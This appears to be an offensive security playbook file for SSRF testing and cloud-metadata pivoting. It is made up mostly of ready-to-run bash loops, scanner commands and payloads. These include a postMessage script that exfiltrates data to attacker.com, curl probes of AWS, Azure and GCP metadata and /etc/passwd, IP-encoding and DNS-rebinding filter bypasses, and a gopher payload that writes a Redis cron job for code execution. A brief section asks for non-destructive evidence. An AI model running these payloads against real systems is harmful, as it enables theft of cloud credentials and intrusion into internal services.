---
name: web-ssrf-cloud-pivot
description: Server-Side Request Forgery testing, internal service probing, IP encoding/DNS rebinding bypasses, cloud metadata harvesting (AWS, Azure, GCP), and webhook pivot exploitation.
playbook: web-security
pivots_to:
  - cloud-aws-iam-privesc
  - cloud-azure-entraid-audit
  - ad-kerberos-delegation-abuse
  - infra-container-escape-audit
---

# Server-Side Request Forgery (SSRF) & Cloud Metadata Pivoting

## Attack Vector Summary
Server-Side Request Forgery (SSRF) occurs when a web application accepts a user-supplied URL (or parameter payload) and fetches resources from that URL server-side without proper host/IP validation, enabling attackers to interact with internal services, read cloud instance metadata (IMDS), or pivot into internal infrastructure.

## Tactical Heuristics & Step-by-Step Flow

### 1. Parameter Extraction & LFI Overlap (R13 Step 1)
Extract SSRF-prone parameter names from harvested URLs, and merge with LFI candidates:

```bash
# 1. Scan collected URLs for SSRF-prone parameter names
grep -oP '(\?|&)(url|dest|redirect|uri|path|continue|window|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|file|load|read|image|img|src|href|action|target)=[^&\s]+' \
  Recon/target_gau.txt Recon/target_katana.txt Recon/target_wayback.txt 2>/dev/null | \
  sort -u > Recon/target_ssrf_params.txt

# 2. Overlap with LFI parameters (ptLFI.txt often work for SSRF too)
if [ -s Recon/ptLFI.txt ]; then
  cat Recon/ptLFI.txt >> Recon/target_ssrf_params.txt
  sort -u -o Recon/target_ssrf_params.txt Recon/target_ssrf_params.txt
fi
```

### 2. Endpoint Parameter Brute-Forcing (R13 Step 2)
For high-priority API endpoints, probe for undocumented SSRF parameter bindings:

```bash
# Generate brute-forced param combinations on discovered endpoints
head -50 Recon/gwjs_endpoints.txt 2>/dev/null | while read base; do
  for param in url dest redirect uri path continue window next data reference site html val validate domain callback return page feed host port to out view dir file load read image img src href action target; do
    echo "${base}?${param}={TARGET}" >> Recon/target_ssrf_params_bruteforce.txt
  done
done
```

### 3. Automated & Out-Of-Band (OOB) Testing (R13 Step 3)
```bash
# 1. ssrfmap automated scanner on candidate parameters
python3 /home/kali/Tools/ssrfmap/ssrfmap.py -u "https://target.com/page?url=COLLABORATOR" \
  -p "url" --method GET 2>/dev/null

# 2. Start interactsh client listener for OOB DNS/HTTP interactions
interactsh-client -n 30 -v 2>&1 | tee Recon/target_oob.txt
```

### 4. PostMessage Cross-Origin SSRF (R13 Step 4)
If target application registers postMessage handlers that fetch URLs:
```javascript
// Attacker iframe payload
iframe.contentWindow.postMessage({url: "http://169.254.169.254/latest/meta-data/"}, "*");

window.addEventListener("message", (e) => {
  fetch("https://attacker.com/exfil?data=" + btoa(e.data));
});
```

### 5. Loopback & Cloud Instance Metadata (IMDS) Probes
```bash
# Loopback & Cloud metadata URLs
for target_probe in "http://169.254.169.254/latest/meta-data/" \
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
                    "http://metadata.google.internal/computeMetadata/v1/" \
                    "http://127.0.0.1:6379/INFO" \
                    "http://localhost:5000" \
                    "file:///etc/passwd"; do
  curl -s -m 3 "https://target.com/api/fetch?url=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$target_probe'))")" \
    -o /dev/null -w "%{http_code} %{size_download}B — $target_probe\n"
done
```

#### Filter & WAF Bypasses:
- **IP Encodings:** Decimal `http://2130706433/`, Hex `http://0x7f000001/`, Octal `http://017700000001/`, Short `http://127.1/`, IPv6 `http://[::1]/`.
- **DNS Rebinding:** `127.0.0.1.nip.io` or custom TTL=0 rebinding domain.
- **Protocol Wrappers:** `gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a`, `dict://127.0.0.1:11211/stat`.

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| PDF Renderer SSRF to IMDS | Headless browser embeds `<iframe>` | `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>` | AWS AccessKeyId / SecretAccessKey rendered in PDF text |
| DNS Rebinding on Webhook Validation | TOCTOU DNS lookup | Domain resolves to public IP first, `127.0.0.1` on second fetch | Local service HTTP response in webhook delivery log |
| Redis RCE via Gopher/CRLF | Unauthenticated internal Redis instance | `gopher://127.0.0.1:6379/_SET...CONFIG%20SET%20dir%20/var/spool/cron` | `+OK` responses in body or SSH key written |
| Open Redirect SSRF Bypass | Application checks `starts_with("https://trusted.com")` | `https://trusted.com/oauth/redirect?to=http://169.254.169.254/` | 302 follow bypasses hostname validation |

## Evidence Collection & Validation Gate
- Capture HTTP request and full response body showing internal headers, cloud metadata secrets, or internal service banners.
- Demonstrate read access to internal endpoints without destructive actions.
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
